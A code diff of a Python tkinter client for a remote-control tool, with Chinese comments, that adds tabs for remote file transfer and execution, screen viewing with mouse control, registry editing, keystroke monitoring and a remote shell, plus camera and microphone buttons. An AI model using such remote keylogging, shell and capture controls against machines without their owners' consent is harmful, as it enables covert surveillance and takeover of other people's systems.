@@ -1,6 +1,6 @@
 """
-远程控制客户端 - 可视化增强版（修复版）
-修复了协议混乱、socket竞争等问题
+远程控制客户端 - 可视化版（与控制台菜单对应）
+所有功能与服务端实际支持的功能一一对应
 """
 
 import tkinter as tk
@@ -27,12 +27,10 @@ class VisualClientUI(tk.Tk):
 
         self.sock = None
         self.is_connected = False
-        self.stream_window = None
-        self.monitor_running = False
         self.streaming = False
-        self.system_data = {}
+        self.keyboard_monitoring = False
 
-        # 添加socket锁，防止多线程竞争
+        # Socket锁，防止多线程竞争
         self.sock_lock = threading.Lock()
 
         self._init_login_ui()
@@ -72,7 +70,7 @@ class VisualClientUI(tk.Tk):
         btn_connect.pack(pady=20, fill='x', padx=40)
 
     def _init_dashboard_ui(self):
-        """初始化可视化仪表盘"""
+        """初始化主界面"""
         # 在销毁前保存IP地址
         self.target_ip = self.entry_ip.get()
         self.login_frame.destroy()
@@ -85,17 +83,17 @@ class VisualClientUI(tk.Tk):
         self._style_notebook()
         self.notebook.pack(fill='both', expand=True, padx=PADDING, pady=PADDING)
 
-        # 创建各个功能标签页
-        self._create_dashboard_tab()      # 仪表盘（系统监控）
-        self._create_screen_tab()         # 屏幕监控
-        self._create_shell_tab()          # Shell终端
+        # 创建各个功能标签页（与控制台菜单对应）
+        self._create_sysinfo_tab()        # 9. 系统信息（静态）
+        self._create_files_tab()          # 3. 文件管理
+        self._create_screen_tab()         # 7. 屏幕实时查看+鼠标控制
+        self._create_registry_tab()       # 5. 注册表管理
+        self._create_keyboard_tab()       # 8. 键盘监控
+        self._create_shell_tab()          # 4. Shell终端
         self._create_history_tab()        # 操作历史
 
         # 底部快捷操作栏
         self._create_quick_actions()
-
-        # 启动后台监控线程
-        self.start_monitoring()
 
     def _style_notebook(self):
         """自定义Notebook样式"""
@@ -148,100 +146,245 @@ class VisualClientUI(tk.Tk):
         self.lbl_time.config(text=now)
         self.after(1000, self._update_time)
 
-    # ==================== 标签页1: 系统监控仪表盘 ====================
+    # ==================== 标签页1: 系统信息（静态）====================
 
-    def _create_dashboard_tab(self):
-        """创建系统监控仪表盘"""
+    def _create_sysinfo_tab(self):
+        """创建系统信息标签页"""
         tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
-        self.notebook.add(tab, text="📊 DASHBOARD")
+        self.notebook.add(tab, text="💻 SYSTEM INFO")
 
-        # 左侧：实时监控指标
-        left_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
-        left_panel.pack(side='left', fill='both', expand=True, padx=10, pady=10)
+        # 顶部刷新按钮
+        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        control_frame.pack(fill='x', padx=10, pady=10)
 
-        # 系统信息卡片
-        self._create_metric_card(left_panel, "SYSTEM INFO", 0)
-        self.sys_info_labels = {}
-        info_frame = tk.Frame(left_panel, bg=COLORS['bg_lighter'])
-        info_frame.pack(fill='x', pady=(0, 10))
+        tk.Button(control_frame, text="🔄 REFRESH INFO", command=self.refresh_sys_info,
+                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
 
-        for i, key in enumerate(['OS', 'Hostname', 'IP', 'CPU Cores']):
-            tk.Label(info_frame, text=f"{key}:", font=FONTS['small'],
-                    bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).grid(row=i, column=0, sticky='w', padx=10, pady=2)
-            lbl = tk.Label(info_frame, text="Loading...", font=FONTS['small'],
-                          bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
-            lbl.grid(row=i, column=1, sticky='w', padx=10, pady=2)
-            self.sys_info_labels[key] = lbl
+        # 信息显示区域
+        info_frame = tk.Frame(tab, bg=COLORS['bg_lighter'], bd=2, relief='solid')
+        info_frame.pack(fill='both', expand=True, padx=20, pady=10)
 
-        # CPU使用率
-        self._create_metric_card(left_panel, "CPU USAGE", 1)
-        self.cpu_progress = self._create_progress_bar(left_panel)
-        self.lbl_cpu = tk.Label(left_panel, text="0%", font=FONTS['h2'],
-                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
-        self.lbl_cpu.pack()
+        # 创建信息标签
+        self.sysinfo_labels = {}
+        info_items = [
+            ('OS', 'Operating System'),
+            ('OS Version', 'System Version'),
+            ('OS Release', 'System Release'),
+            ('Architecture', 'Architecture'),
+            ('Processor', 'Processor'),
+            ('Hostname', 'Hostname'),
+            ('IP Address', 'IP Address'),
+            ('Python Version', 'Python Version'),
+            ('Online Status', 'Online Status')
+        ]
 
-        # 内存使用率
-        self._create_metric_card(left_panel, "MEMORY USAGE", 2)
-        self.mem_progress = self._create_progress_bar(left_panel)
-        self.lbl_mem = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
-                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
-        self.lbl_mem.pack()
+        for i, (key, display_name) in enumerate(info_items):
+            # 左侧标签
+            tk.Label(info_frame, text=f"{display_name}:", font=FONTS['body'],
+                    bg=COLORS['bg_lighter'], fg=COLORS['fg_white'], anchor='w').grid(
+                        row=i, column=0, sticky='w', padx=20, pady=8)
 
-        # 磁盘使用率
-        self._create_metric_card(left_panel, "DISK USAGE", 3)
-        self.disk_progress = self._create_progress_bar(left_panel)
-        self.lbl_disk = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
-                                bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
-        self.lbl_disk.pack()
+            # 右侧值
+            lbl_value = tk.Label(info_frame, text="Loading...", font=FONTS['body'],
+                                bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'], anchor='w')
+            lbl_value.grid(row=i, column=1, sticky='w', padx=20, pady=8)
+            self.sysinfo_labels[key] = lbl_value
 
-        # 右侧：网络监控和系统状态
-        right_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
-        right_panel.pack(side='right', fill='both', expand=True, padx=10, pady=10)
+        # 自动加载
+        self.after(500, self.refresh_sys_info)
 
-        # 网络连接数
-        self._create_metric_card(right_panel, "NETWORK CONNECTIONS", 0)
-        self.lbl_network = tk.Label(right_panel, text="0 Active", font=FONTS['h2'],
-                                   bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
-        self.lbl_network.pack(pady=10)
+    def refresh_sys_info(self):
+        """刷新系统信息"""
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_system_info_message())
+                    msg = receive_message(self.sock)
 
-        # 进程数量
-        self._create_metric_card(right_panel, "RUNNING PROCESSES", 1)
-        self.lbl_processes = tk.Label(right_panel, text="0 Processes", font=FONTS['h2'],
-                                     bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
-        self.lbl_processes.pack(pady=10)
+                if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
+                    info = msg['data']['info']
 
-        # 系统运行时间
-        self._create_metric_card(right_panel, "UPTIME", 2)
-        self.lbl_uptime = tk.Label(right_panel, text="0d 0h 0m", font=FONTS['h2'],
-                                  bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
-        self.lbl_uptime.pack(pady=10)
+                    # 更新UI
+                    self.after(0, lambda: self._update_sysinfo_display(info))
+                    self.add_history("System Info", "Retrieved system information", "Success")
+            except Exception as e:
+                print(f"Get sys info error: {e}")
 
-        # 实时日志
-        self._create_metric_card(right_panel, "SYSTEM LOG", 3)
-        self.log_dashboard = scrolledtext.ScrolledText(right_panel, height=10,
-                                                       bg='black', fg=COLORS['fg_secondary'],
-                                                       font=FONTS['small'])
-        self.log_dashboard.pack(fill='both', expand=True)
+        threading.Thread(target=_thread, daemon=True).start()
 
-    def _create_metric_card(self, parent, title, row):
-        """创建指标卡片标题"""
-        lbl = tk.Label(parent, text=f"[ {title} ]", font=FONTS['body'],
-                      bg=COLORS['bg_dark'], fg=COLORS['fg_white'])
-        lbl.pack(anchor='w', pady=(10 if row > 0 else 0, 5))
+    def _update_sysinfo_display(self, info):
+        """更新系统信息显示"""
+        mapping = {
+            'OS': info.get('os', 'N/A'),
+            'OS Version': info.get('os_version', 'N/A'),
+            'OS Release': info.get('os_release', 'N/A'),
+            'Architecture': info.get('architecture', 'N/A'),
+            'Processor': info.get('processor', 'N/A'),
+            'Hostname': info.get('hostname', 'N/A'),
+            'IP Address': info.get('ip_address', 'N/A'),
+            'Python Version': info.get('python_version', 'N/A'),
+            'Online Status': '在线' if info.get('online') else '离线'
+        }
 
-    def _create_progress_bar(self, parent):
-        """创建进度条"""
-        canvas = tk.Canvas(parent, height=20, bg=COLORS['bg_dark'], highlightthickness=0)
-        canvas.pack(fill='x', pady=5)
+        for key, value in mapping.items():
+            if key in self.sysinfo_labels:
+                self.sysinfo_labels[key].config(text=value)
 
-        # 背景条
-        canvas.create_rectangle(0, 0, 400, 20, fill=COLORS['progress_bg'], outline='')
-        # 进度条（初始为0）
-        bar = canvas.create_rectangle(0, 0, 0, 20, fill=COLORS['progress_fill'], outline='')
-        canvas.bar = bar
-        return canvas
+    # ==================== 标签页2: 文件管理 ====================
 
-    # ==================== 标签页2: 屏幕监控 ====================
+    def _create_files_tab(self):
+        """创建文件管理标签页"""
+        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
+        self.notebook.add(tab, text="📂 FILES")
+
+        # 顶部路径和控制栏
+        top_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        top_frame.pack(fill='x', padx=10, pady=10)
+
+        tk.Label(top_frame, text="File Path:", bg=COLORS['bg_lighter'],
+                fg='white', font=FONTS['body']).pack(side='left', padx=5)
+
+        self.file_path_entry = tk.Entry(top_frame, font=FONTS['mono'], bg='#333',
+                                        fg='white', insertbackground='white')
+        self.file_path_entry.pack(side='left', fill='x', expand=True, padx=5)
+        self.file_path_entry.insert(0, ".")
+
+        # 操作按钮栏
+        btn_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
+        btn_frame.pack(fill='x', padx=10)
+
+        buttons = [
+            ("⬇️ DOWNLOAD", self.download_file),
+            ("⬆️ UPLOAD", self.upload_file),
+            ("▶️ EXECUTE", self.execute_file),
+        ]
+
+        for text, cmd in buttons:
+            tk.Button(btn_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
+                     fg='white', font=FONTS['body'], relief='flat').pack(side='left', padx=5, pady=5)
+
+        # 说明文本
+        note_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        note_frame.pack(fill='both', expand=True, padx=20, pady=20)
+
+        note_text = """
+文件管理功能说明：
+
+• 下载文件 (DOWNLOAD)
+  在上方输入框输入远程文件路径，点击"DOWNLOAD"下载到本地
+
+• 上传文件 (UPLOAD)
+  点击"UPLOAD"选择本地文件，上传到远程的安全目录
+
+• 执行文件 (EXECUTE)
+  在上方输入框输入远程文件路径，点击"EXECUTE"在远程执行
+  (仅支持Python文件 .py)
+
+注意：
+- 所有文件操作都限制在服务端的安全目录内
+- 安全目录默认为: safe_files/
+- 下载时使用相对路径，如: test.txt
+"""
+        tk.Label(note_frame, text=note_text, font=FONTS['small'],
+                bg=COLORS['bg_lighter'], fg=COLORS['fg_white'],
+                justify='left', anchor='w').pack(fill='both', expand=True, padx=20, pady=20)
+
+    def download_file(self):
+        """下载文件"""
+        filepath = self.file_path_entry.get()
+        if not filepath:
+            messagebox.showwarning("Warning", "Please enter file path")
+            return
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_file_download_message(filepath))
+                    header = receive_message(self.sock)
+
+                    if header and header['type'] == MessageType.FILE_DATA:
+                        if header['data']['success']:
+                            file_data = receive_binary_data(self.sock)
+                            filename = header['data']['filename']
+
+                            save_path = filedialog.asksaveasfilename(initialfile=filename)
+                            if save_path:
+                                with open(save_path, 'wb') as f:
+                                    f.write(file_data)
+                                self.after(0, lambda: messagebox.showinfo("Success", f"File downloaded to {save_path}"))
+                                self.add_history("File", f"Downloaded: {filepath}", "Success")
+                        else:
+                            error = header['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", f"Download failed: {error}"))
+            except Exception as e:
+                print(f"Download error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def upload_file(self):
+        """上传文件"""
+        local_path = filedialog.askopenfilename()
+        if not local_path:
+            return
+
+        filename = local_path.split('/')[-1]
+
+        def _thread():
+            try:
+                # 读取文件
+                with open(local_path, 'rb') as f:
+                    file_data = f.read()
+
+                with self.sock_lock:
+                    # 发送上传请求
+                    send_message(self.sock, create_file_upload_message(filename, filename))
+                    # 发送文件数据
+                    send_binary_data(self.sock, file_data)
+                    # 接收响应
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.FILE_UPLOAD_RESPONSE:
+                        if resp['data']['success']:
+                            self.after(0, lambda: messagebox.showinfo("Success", "File uploaded successfully"))
+                            self.add_history("File", f"Uploaded: {filename}", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", f"Upload failed: {error}"))
+            except Exception as e:
+                print(f"Upload error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def execute_file(self):
+        """执行文件"""
+        filepath = self.file_path_entry.get()
+        if not filepath:
+            messagebox.showwarning("Warning", "Please enter file path")
+            return
+
+        args = simpledialog.askstring("Arguments", "Enter arguments (optional):", initialvalue="")
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_file_execute_message(filepath, args or ''))
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.FILE_EXECUTE_RESPONSE:
+                        if resp['data']['success']:
+                            output = resp['data'].get('output', 'Executed successfully')
+                            self.after(0, lambda: messagebox.showinfo("Success", f"Output:\n{output}"))
+                            self.add_history("File", f"Executed: {filepath}", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", f"Execution failed: {error}"))
+            except Exception as e:
+                print(f"Execute error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    # ==================== 标签页3: 屏幕监控+鼠标控制 ====================
 
     def _create_screen_tab(self):
         """创建屏幕监控标签"""
@@ -277,12 +420,380 @@ class VisualClientUI(tk.Tk):
         self.quality_scale.set(50)
         self.quality_scale.pack(side='left')
 
+        # 鼠标控制提示
+        tk.Label(control_frame, text="| Mouse Control: Click on screen to send mouse events",
+                bg=COLORS['bg_lighter'], fg=COLORS['fg_warning'], font=FONTS['small']).pack(side='left', padx=20)
+
         # 屏幕显示区域
         self.screen_label = tk.Label(tab, bg='black', text="Screen stream will appear here\nClick START STREAM",
                                     fg=COLORS['fg_white'], font=FONTS['h2'])
         self.screen_label.pack(fill='both', expand=True, padx=10, pady=10)
 
-    # ==================== 标签页3: Shell终端 ====================
+        # 绑定鼠标事件（用于远程控制）
+        self.screen_label.bind('<Button-1>', self.on_screen_click)
+        self.screen_label.bind('<Button-3>', self.on_screen_right_click)
+
+    def on_screen_click(self, event):
+        """处理屏幕点击（鼠标控制）"""
+        if not self.streaming:
+            return
+
+        # 获取点击位置相对于图像的坐标
+        x, y = event.x, event.y
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_mouse_event_message('click', x, y, 'left', 1))
+                    resp = receive_message(self.sock)
+                    print(f"Mouse click sent: ({x}, {y})")
+            except Exception as e:
+                print(f"Mouse click error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def on_screen_right_click(self, event):
+        """处理屏幕右键点击"""
+        if not self.streaming:
+            return
+
+        x, y = event.x, event.y
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_mouse_event_message('click', x, y, 'right', 1))
+                    resp = receive_message(self.sock)
+                    print(f"Mouse right-click sent: ({x}, {y})")
+            except Exception as e:
+                print(f"Mouse right-click error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def start_screen_stream(self):
+        """开始屏幕流"""
+        if self.streaming:
+            return
+
+        quality = self.quality_scale.get()
+
+        with self.sock_lock:
+            send_message(self.sock, create_screen_start_message(fps=10, quality=quality))
+
+        self.streaming = True
+        self.btn_start_stream.config(state='disabled')
+        self.btn_stop_stream.config(state='normal')
+
+        threading.Thread(target=self._screen_stream_loop, daemon=True).start()
+        self.add_history("Screen", "Started screen streaming", "Success")
+
+    def stop_screen_stream(self):
+        """停止屏幕流"""
+        self.streaming = False
+
+        with self.sock_lock:
+            send_message(self.sock, create_screen_stop_message())
+
+        self.screen_label.config(image='', text="Stream stopped\nClick START STREAM to resume")
+        self.btn_start_stream.config(state='normal')
+        self.btn_stop_stream.config(state='disabled')
+        self.add_history("Screen", "Stopped screen streaming", "Success")
+
+    def _screen_stream_loop(self):
+        """屏幕流接收循环"""
+        try:
+            # 接收开始响应
+            with self.sock_lock:
+                _ = receive_message(self.sock)
+
+            while self.streaming:
+                try:
+                    with self.sock_lock:
+                        msg = receive_message(self.sock)
+                        if not msg:
+                            break
+
+                        if msg['type'] == MessageType.SCREEN_FRAME:
+                            img_bytes = receive_binary_data(self.sock)
+                            if img_bytes:
+                                image = Image.open(io.BytesIO(img_bytes))
+                                # 缩放以适应标签页
+                                image.thumbnail((900, 500))
+                                photo = ImageTk.PhotoImage(image)
+
+                                if self.streaming:
+                                    self.after(0, lambda p=photo: self._update_screen_frame(p))
+                        elif msg['type'] == MessageType.SCREEN_STOP:
+                            break
+                except Exception as e:
+                    print(f"Stream frame error: {e}")
+                    break
+        except Exception as e:
+            print(f"Stream error: {e}")
+        finally:
+            self.streaming = False
+            self.after(0, lambda: self.btn_start_stream.config(state='normal'))
+            self.after(0, lambda: self.btn_stop_stream.config(state='disabled'))
+
+    def _update_screen_frame(self, photo):
+        """更新屏幕帧"""
+        try:
+            self.screen_label.configure(image=photo, text='')
+            self.screen_label.image = photo
+        except:
+            pass
+
+    def take_screenshot(self):
+        """截取屏幕截图"""
+        self.req_screenshot()
+
+    # ==================== 标签页4: 注册表管理 ====================
+
+    def _create_registry_tab(self):
+        """创建注册表管理标签页（仅Windows）"""
+        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
+        self.notebook.add(tab, text="🔐 REGISTRY")
+
+        # 说明
+        note_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        note_frame.pack(fill='x', padx=10, pady=10)
+
+        tk.Label(note_frame, text="⚠️ Registry management is only available on Windows systems",
+                font=FONTS['body'], bg=COLORS['bg_lighter'], fg=COLORS['fg_warning']).pack(pady=10)
+
+        # 操作区域
+        input_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
+        input_frame.pack(fill='x', padx=20, pady=10)
+
+        # Hive选择
+        tk.Label(input_frame, text="Hive:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=0, column=0, sticky='w', pady=5)
+        self.registry_hive = ttk.Combobox(input_frame, values=['HKLM', 'HKCU', 'HKCR', 'HKU', 'HKCC'],
+                                         font=FONTS['mono'], width=20)
+        self.registry_hive.set('HKLM')
+        self.registry_hive.grid(row=0, column=1, sticky='w', padx=10, pady=5)
+
+        # 键路径
+        tk.Label(input_frame, text="Key Path:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=1, column=0, sticky='w', pady=5)
+        self.registry_path = tk.Entry(input_frame, font=FONTS['mono'], bg='#333', fg='white',
+                                     insertbackground='white', width=50)
+        self.registry_path.insert(0, "SOFTWARE\\")
+        self.registry_path.grid(row=1, column=1, sticky='w', padx=10, pady=5)
+
+        # 值名称
+        tk.Label(input_frame, text="Value Name:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=2, column=0, sticky='w', pady=5)
+        self.registry_name = tk.Entry(input_frame, font=FONTS['mono'], bg='#333', fg='white',
+                                     insertbackground='white', width=50)
+        self.registry_name.grid(row=2, column=1, sticky='w', padx=10, pady=5)
+
+        # 操作按钮
+        btn_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
+        btn_frame.pack(fill='x', padx=20, pady=10)
+
+        tk.Button(btn_frame, text="🔍 QUERY", command=self.query_registry,
+                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        tk.Button(btn_frame, text="✏️ SET", command=self.set_registry,
+                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        tk.Button(btn_frame, text="🗑️ DELETE", command=self.delete_registry,
+                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        # 结果显示区域
+        result_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
+        result_frame.pack(fill='both', expand=True, padx=20, pady=10)
+
+        tk.Label(result_frame, text="Result:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).pack(anchor='w')
+
+        self.registry_result = scrolledtext.ScrolledText(result_frame, height=15,
+                                                        bg='black', fg=COLORS['fg_secondary'],
+                                                        font=FONTS['mono'])
+        self.registry_result.pack(fill='both', expand=True)
+
+    def query_registry(self):
+        """查询注册表"""
+        hive = self.registry_hive.get()
+        key_path = self.registry_path.get()
+        name = self.registry_name.get() or None
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_registry_query_message(hive, key_path, name))
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
+                        if resp['data']['success']:
+                            result = json.dumps(resp['data'].get('result', {}), indent=2)
+                            self.after(0, lambda: self.registry_result.delete('1.0', tk.END))
+                            self.after(0, lambda: self.registry_result.insert('1.0', result))
+                            self.add_history("Registry", f"Queried: {hive}\\{key_path}", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", error))
+            except Exception as e:
+                print(f"Registry query error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def set_registry(self):
+        """设置注册表值"""
+        hive = self.registry_hive.get()
+        key_path = self.registry_path.get()
+        name = self.registry_name.get()
+
+        if not name:
+            messagebox.showwarning("Warning", "Please enter value name")
+            return
+
+        value = simpledialog.askstring("Set Registry", "Enter value:")
+        if value is None:
+            return
+
+        value_type = simpledialog.askstring("Set Registry", "Enter value type (REG_SZ/REG_DWORD):",
+                                           initialvalue="REG_SZ")
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_registry_set_message(hive, key_path, name, value, value_type))
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
+                        if resp['data']['success']:
+                            self.after(0, lambda: messagebox.showinfo("Success", "Registry value set successfully"))
+                            self.add_history("Registry", f"Set: {hive}\\{key_path}\\{name}", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", error))
+            except Exception as e:
+                print(f"Registry set error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    def delete_registry(self):
+        """删除注册表值"""
+        hive = self.registry_hive.get()
+        key_path = self.registry_path.get()
+        name = self.registry_name.get() or None
+
+        if not messagebox.askyesno("Confirm", f"Delete registry value?\n{hive}\\{key_path}\\{name or '(entire key)'}"):
+            return
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_registry_delete_message(hive, key_path, name))
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
+                        if resp['data']['success']:
+                            self.after(0, lambda: messagebox.showinfo("Success", "Registry value deleted"))
+                            self.add_history("Registry", f"Deleted: {hive}\\{key_path}\\{name or '(key)'}", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", error))
+            except Exception as e:
+                print(f"Registry delete error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+
+    # ==================== 标签页5: 键盘监控 ====================
+
+    def _create_keyboard_tab(self):
+        """创建键盘监控标签页"""
+        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
+        self.notebook.add(tab, text="🕵️ KEYBOARD")
+
+        # 控制栏
+        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        control_frame.pack(fill='x', padx=10, pady=10)
+
+        self.btn_start_keyboard = tk.Button(control_frame, text="▶ START MONITORING",
+                                           command=self.start_keyboard_monitor,
+                                           bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
+                                           relief='flat')
+        self.btn_start_keyboard.pack(side='left', padx=5)
+
+        self.btn_stop_keyboard = tk.Button(control_frame, text="⏹ STOP MONITORING",
+                                          command=self.stop_keyboard_monitor,
+                                          bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
+                                          relief='flat', state='disabled')
+        self.btn_stop_keyboard.pack(side='left', padx=5)
+
+        tk.Button(control_frame, text="🗑️ CLEAR", command=self.clear_keyboard_log,
+                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        # 键盘记录显示区域
+        log_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
+        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
+
+        tk.Label(log_frame, text="[ KEYBOARD EVENTS LOG ]", font=FONTS['body'],
+                bg=COLORS['bg_dark'], fg=COLORS['fg_white']).pack(anchor='w')
+
+        self.keyboard_log = scrolledtext.ScrolledText(log_frame, height=25,
+                                                      bg='black', fg=COLORS['fg_primary'],
+                                                      font=FONTS['mono'])
+        self.keyboard_log.pack(fill='both', expand=True)
+
+    def start_keyboard_monitor(self):
+        """开始键盘监控"""
+        if self.keyboard_monitoring:
+            return
+
+        def _thread():
+            try:
+                with self.sock_lock:
+                    send_message(self.sock, create_keyboard_monitor_start_message())
+
+                self.keyboard_monitoring = True
+                self.after(0, lambda: self.btn_start_keyboard.config(state='disabled'))
+                self.after(0, lambda: self.btn_stop_keyboard.config(state='normal'))
+
+                # 开始接收键盘事件
+                while self.keyboard_monitoring:
+                    try:
+                        with self.sock_lock:
+                            msg = receive_message(self.sock)
+
+                        if msg and msg['type'] == MessageType.KEYBOARD_EVENT:
+                            key = msg['data']['key']
+                            event_type = msg['data']['event_type']
+                            timestamp = msg['data']['timestamp']
+
+                            log_entry = f"[{timestamp}] {event_type.upper()}: {key}\n"
+                            self.after(0, lambda e=log_entry: self.keyboard_log.insert(tk.END, e))
+                            self.after(0, lambda: self.keyboard_log.see(tk.END))
+
+                    except Exception as e:
+                        print(f"Keyboard event error: {e}")
+                        break
+
+            except Exception as e:
+                print(f"Keyboard monitor error: {e}")
+
+        threading.Thread(target=_thread, daemon=True).start()
+        self.add_history("Keyboard", "Started keyboard monitoring", "Success")
+
+    def stop_keyboard_monitor(self):
+        """停止键盘监控"""
+        self.keyboard_monitoring = False
+
+        with self.sock_lock:
+            send_message(self.sock, create_keyboard_monitor_stop_message())
+
+        self.btn_start_keyboard.config(state='normal')
+        self.btn_stop_keyboard.config(state='disabled')
+        self.add_history("Keyboard", "Stopped keyboard monitoring", "Success")
+
+    def clear_keyboard_log(self):
+        """清空键盘日志"""
+        self.keyboard_log.delete('1.0', tk.END)
+
+    # ==================== 标签页6: Shell终端 ====================
 
     def _create_shell_tab(self):
         """创建Shell终端"""
@@ -313,7 +824,37 @@ class VisualClientUI(tk.Tk):
                  bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                  relief='flat').pack(side='right', padx=5)
 
-    # ==================== 标签页4: 操作历史 ====================
+    def send_shell_command(self, event):
+        """发送Shell命令"""
+        cmd = self.shell_entry.get()
+        if not cmd:
+            return
+
+        self.shell_entry.delete(0, tk.END)
+        self.shell_text.insert(tk.END, f"{cmd}\n")
+
+        # 发送命令
+        with self.sock_lock:
+            send_message(self.sock, create_shell_message(cmd))
+
+        # 接收响应
+        threading.Thread(target=self._wait_shell_response, daemon=True).start()
+
+        self.add_history("Shell", f"Executed: {cmd}", "Success")
+
+    def _wait_shell_response(self):
+        """等待Shell响应"""
+        try:
+            with self.sock_lock:
+                resp = receive_message(self.sock)
+            if resp and resp['type'] == MessageType.SHELL_RESPONSE:
+                output = resp['data']['output']
+                self.after(0, lambda: self.shell_text.insert(tk.END, f"{output}\n> "))
+                self.after(0, lambda: self.shell_text.see(tk.END))
+        except Exception as e:
+            print(f"Shell response error: {e}")
+
+    # ==================== 标签页7: 操作历史 ====================
 
     def _create_history_tab(self):
         """创建操作历史时间线"""
@@ -365,7 +906,6 @@ class VisualClientUI(tk.Tk):
             ("📸 Screenshot", self.req_screenshot),
             ("📷 Camera", self.req_camera),
             ("🎤 Mic Record", self.req_mic_record),
-            ("ℹ️ Sys Info", self.req_sys_info_full),
         ]
 
         for text, cmd in actions:
@@ -407,8 +947,8 @@ class VisualClientUI(tk.Tk):
 
     def disconnect(self):
         """断开连接"""
-        self.monitor_running = False
         self.streaming = False
+        self.keyboard_monitoring = False
         if self.sock:
             try:
                 send_message(self.sock, create_disconnect_message())
@@ -416,225 +956,6 @@ class VisualClientUI(tk.Tk):
             except:
                 pass
         self.destroy()
-
-    # ==================== 监控功能 ====================
-
-    def start_monitoring(self):
-        """启动后台监控"""
-        self.monitor_running = True
-        threading.Thread(target=self._monitor_loop, daemon=True).start()
-
-    def _monitor_loop(self):
-        """监控循环 - 定期获取系统信息"""
-        while self.monitor_running:
-            # 如果正在进行屏幕流，暂停监控以避免冲突
-            if self.streaming:
-                time.sleep(1)
-                continue
-
-            try:
-                with self.sock_lock:
-                    # 获取系统信息
-                    send_message(self.sock, create_system_info_message())
-                    msg = receive_message(self.sock)
-
-                if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
-                    info = msg['data']['info']
-                    self.system_data = info
-                    self.after(0, lambda i=info: self._update_dashboard(i))
-
-                time.sleep(3)  # 每3秒更新一次
-            except Exception as e:
